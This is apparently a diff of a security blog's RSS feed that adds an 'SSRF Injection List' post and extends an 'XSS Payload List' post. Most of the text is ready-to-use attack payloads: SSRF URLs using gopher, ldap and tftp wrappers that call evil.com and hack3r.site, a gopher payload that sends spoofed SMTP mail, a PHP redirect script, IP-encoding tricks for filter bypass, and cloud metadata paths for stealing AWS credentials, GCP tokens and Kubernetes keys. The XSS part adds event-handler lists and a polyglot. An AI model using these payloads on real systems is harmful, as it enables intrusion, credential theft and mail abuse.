+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssrf.php?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sftp://evil.com:11111/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tftp Wrapper&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssrf.php?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;tftp://evil.com:12346/TESTUDPPACKET
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ldap Wrapper&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssrf.php?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ldap://localhost:11211/%0astats%0aquit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Gopher Wrapper&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssrf.php?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+
+will make a request like
+HELO localhost
+MAIL &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;:&amp;lt;hacker@site.com&amp;gt;
+RCPT TO:&amp;lt;victim@site.com&amp;gt;
+&lt;span class=&quot;k&quot;&gt;DATA
+From&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Hacker] &amp;lt;hacker@site.com&amp;gt;
+To: &amp;lt;victime@site.com&amp;gt;
+Date: Tue, 15 Sep 2017 17:20:26 -0400
+Subject: Ah Ah AH
+
+You didn&lt;span class=&quot;s1&quot;&gt;'t say the magic word !
+
+
+.
+QUIT
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Gopher SMTP - Back connect to 1337&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content of evil.com/redirect.php:
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Location: gopher://hack3r.site:1337/_SSRF%0ATest!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+
+Now query it.
+https://example.com/?q=http://evil.com/redirect.php.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Gopher SMTP - send a mail&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content of evil.com/redirect.php:
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$commands&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;s1&quot;&gt;'HELO victim.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s1&quot;&gt;'MAIL FROM: &amp;lt;admin@victim.com&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s1&quot;&gt;'RCPT To: &amp;lt;sxcurity@oou.us&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s1&quot;&gt;'DATA'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s1&quot;&gt;'Subject: @sxcurity!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s1&quot;&gt;'Corben was here, woot woot!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%0A'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Location: gopher://0:25/_'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ssrf-to-xss-by-d0rkerdevil--alyssaoherrera&quot;&gt;SSRF to XSS by &lt;a href=&quot;https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158&quot;&gt;@D0rkerDevil &amp;amp; @alyssa.o.herrera&lt;/a&gt;&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://brutelogic.com.br/poc.svg -&amp;gt; simple alert
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -&amp;gt; simple ssrf
+
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://brutelogic.com.br/poc.svg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ssrf-url-for-cloud-instances&quot;&gt;SSRF URL for Cloud Instances&lt;/h2&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-aws-bucket&quot;&gt;SSRF URL for AWS Bucket&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories&quot;&gt;Docs&lt;/a&gt;
+Interesting path to look for at &lt;code class=&quot;highlighter-rouge&quot;&gt;http://169.254.169.254&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Always here : /latest/meta-data/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;,public-ipv4,...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+User &lt;span class=&quot;k&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;startup script &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;auto-scaling&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : /latest/user-data
+Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;DNS record&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254
+http://metadata.nicob.net/
+http://169.254.169.254.xip.io/
+http://1ynrnhl.xip.io/
+http://www.owasp.org.1ynrnhl.xip.io/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;HTTP redirect&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Static:http://nicob.net/redir6a
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alternate IP encoding&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://425.510.425.510/ Dotted &lt;span class=&quot;kt&quot;&gt;decimal &lt;/span&gt;with overflow
+http://2852039166/ Dotless &lt;span class=&quot;kt&quot;&gt;decimal
+&lt;/span&gt;http://7147006462/ Dotless &lt;span class=&quot;kt&quot;&gt;decimal &lt;/span&gt;with overflow
+http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
+http://0xA9FEA9FE/ Dotless hexadecimal
+http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
+http://0251.0376.0251.0376/ Dotted octal
+http://0251.00376.000251.0000376/ Dotted octal with padding
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;More urls to include&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;E.g: Jira SSRF leading to AWS info disclosure - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-google-cloud&quot;&gt;SSRF URL for Google Cloud&lt;/h3&gt;
+
+&lt;p&gt;Requires the header “Metadata-Flavor: Google” or “X-Google-Metadata-Request: True”&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Google allows recursive pulls&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Interesting files to pull out:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SSH Public Key : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Get Access Token : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Kubernetes Key : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-digital-ocean&quot;&gt;SSRF URL for Digital Ocean&lt;/h3&gt;
+
+&lt;p&gt;Documentation available at &lt;code class=&quot;highlighter-rouge&quot;&gt;https://developers.digitalocean.com/documentation/metadata/&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;curl &lt;/span&gt;http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+All &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;one request:
+&lt;span class=&quot;nb&quot;&gt;curl &lt;/span&gt;http://169.254.169.254/metadata/v1.json | jq
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-packetcloud&quot;&gt;SSRF URL for Packetcloud&lt;/h3&gt;
+
+&lt;p&gt;Documentation available at &lt;code class=&quot;highlighter-rouge&quot;&gt;https://metadata.packet.net/userdata&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-azure&quot;&gt;SSRF URL for Azure&lt;/h3&gt;
+
+&lt;p&gt;Limited, maybe more exists? &lt;code class=&quot;highlighter-rouge&quot;&gt;https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254/metadata/v1/maintenance
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Update Apr 2017, Azure has more support; requires the header “Metadata: true” &lt;code class=&quot;highlighter-rouge&quot;&gt;https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254/metadata/instance?api-version&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2017-04-02&amp;amp;format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;text
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-openstackrackspace&quot;&gt;SSRF URL for OpenStack/RackSpace&lt;/h3&gt;
+
+&lt;p&gt;(header required? unknown)&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254/openstack
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-hp-helion&quot;&gt;SSRF URL for HP Helion&lt;/h3&gt;
+
+&lt;p&gt;(header required? unknown)&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://169.254.169.254/2009-04-04/meta-data/ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-oracle-cloud&quot;&gt;SSRF URL for Oracle Cloud&lt;/h3&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-alibaba&quot;&gt;SSRF URL for Alibaba&lt;/h3&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-kubernetes-etcd&quot;&gt;SSRF URL for Kubernetes ETCD&lt;/h3&gt;
+
+&lt;p&gt;Can contain API keys and internal ip and ports&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;curl&lt;/span&gt; -L http://127.0.0.1:2379/version
+&lt;span class=&quot;nb&quot;&gt;curl &lt;/span&gt;http://127.0.0.1:2379/v2/keys/?recursive&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-docker&quot;&gt;SSRF URL for Docker&lt;/h3&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:2375/v1.24/containers/json
+
+Simple example
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# &lt;span class=&quot;nb&quot;&gt;curl&lt;/span&gt; --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# &lt;span class=&quot;nb&quot;&gt;curl&lt;/span&gt; --unix-socket /var/run/docker.sock http://foo/images/json
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssrf-url-for-rancher&quot;&gt;SSRF URL for Rancher&lt;/h3&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;curl &lt;/span&gt;http://rancher-metadata/&amp;lt;version&amp;gt;/&amp;lt;path&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/&lt;/p&gt;
+
+&lt;h2 id=&quot;examples&quot;&gt;Examples&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/115857&quot;&gt;SSRF and local file read in video to gif converter&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/115748&quot;&gt;SSRF in https://imgur.com/vidgif/url&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/358119&quot;&gt;SSRF in proxy.duckduckgo.com&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/374737&quot;&gt;Blind SSRF on errors.hackerone.net&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/382612&quot;&gt;SSRF on *shopifycloud.com&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;thanks-to&quot;&gt;Thanks to&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF&quot;&gt;Hackerone - How To: Server-Side Request Forgery (SSRF)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://twitter.com/albinowax/status/890725759861403648&quot;&gt;Awesome URL abuse for SSRF by @orange_8361 #BHUSA&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html&quot;&gt;How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=D1S-G8rJrEk&quot;&gt;#HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://blog.safebuff.com/2016/07/03/SSRF-Tips/&quot;&gt;SSRF Tips - xl7dev&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/115748&quot;&gt;SSRF in https://imgur.com/vidgif/url&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dailysecurity.fr/server-side-request-forgery/&quot;&gt;Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf&quot;&gt;AppSecEU15 Server side browsing considered harmful - @Agarri&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://twitter.com/EdOverflow&quot;&gt;Enclosed alphanumerics - @EdOverflow&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.sxcurity.pro/2017/12/17/hackertarget/&quot;&gt;Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51&quot;&gt;PHP SSRF @secjuice&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158&quot;&gt;How I convert SSRF to xss in a ssrf vulnerable Jira&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a&quot;&gt;Piercing the Veil: Server Side Request Forgery to NIPRNet access&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=66ni2BTIjS8&quot;&gt;Hacker101 SSRF&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/&quot;&gt;SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Fri, 19 Apr 2019 18:00:00 +0800</pubDate>
+        <link>http://0.0.0.0:80//blog/SSRF-Injection-List/</link>
+        <guid isPermaLink="true">http://0.0.0.0:80//blog/SSRF-Injection-List/</guid>
+        
+        <category>SSRF</category>
+        
+        <category>Payload</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>XSS Payload List</title>
@@ -55,7 +733,30 @@ window.location.replace(&quot;http://site.com?x=3site.com/?x=3 &quot;-alert`1`,&
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe&amp;gt;&amp;lt;p title=&quot;&amp;lt;/iframe&amp;gt;&amp;lt;svg/onload=alert(45)&amp;gt;&quot;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;onclick
+ondblclick
+onmousedown
+onmousemove
+onmouseover
+onmouseout
+onmouseup
+onkeydown
+onkeypress
+onkeyup
+onabort
+onerror
+onload
+onresize
+onscroll
+onunload
+onsubmit
+onblur
+onchange
+onfocus
+onreset
+onselect
+onMoveOn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;--`&amp;lt;img/src=` onerror=confirm`xss`&amp;gt; --!&amp;gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -94,11 +795,16 @@ data:image/x-icon;base64
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/*'/*`/*&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onmouseover=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/*&amp;amp;lt;svg/*/onload=alert(/xss/)//&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
